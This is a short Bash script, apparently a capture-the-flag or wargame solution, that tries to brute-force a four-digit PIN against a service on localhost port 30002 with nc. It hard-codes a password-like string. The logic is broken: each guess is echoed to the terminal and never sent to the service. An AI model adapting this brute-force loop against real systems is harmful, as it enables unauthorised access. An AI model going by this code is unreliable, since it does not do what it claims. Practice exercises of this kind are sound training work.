#!/bin/bash

function ctrl_c (){
  echo -e "\n\n Saliendo... \n"
  exit 1
}

#ctrl_c
trap ctrl_c INT

for pin in {9999..0000};
do
  output=$(nc localhost 30002)
  echo "nc localhost 30002"
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"
  if [[ $output == *"Correct!"* ]]; then
    echo "PIN encontrado: $pin"
    break
  fi
done
